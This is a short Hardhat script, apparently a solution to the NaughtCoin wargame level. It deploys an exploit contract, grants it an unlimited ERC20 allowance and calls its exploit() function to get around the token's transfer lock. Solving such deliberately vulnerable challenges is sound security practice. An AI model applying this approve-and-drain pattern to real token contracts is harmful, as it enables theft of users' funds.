import { ethers } from "hardhat";

async function main() {
  const [exploiter] = await ethers.getSigners();
  const naughtCoinAddress = "0xc89c5aBEb3ac91f21F47d1bCcD8a82A57B08296e";

  const _naughtCoinExploit = await ethers.getContractFactory(
    "NaughtCoinExploit"
  );
  const NaughtCoinExploit = await _naughtCoinExploit
    .connect(exploiter)
    .deploy(naughtCoinAddress);
  await NaughtCoinExploit.deployed();

  const NaughtCoin = await ethers.getContractAt("ERC20", naughtCoinAddress);
  const approveTx = await NaughtCoin.connect(exploiter).approve(
    NaughtCoinExploit.address,
    ethers.constants.MaxUint256
  );
  await approveTx.wait();

  const exploitTx = await NaughtCoinExploit.connect(exploiter).exploit();
  await exploitTx.wait();

  const exploitStatus = await NaughtCoinExploit.exploited();
  console.log(`Exploited: ${exploitStatus}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
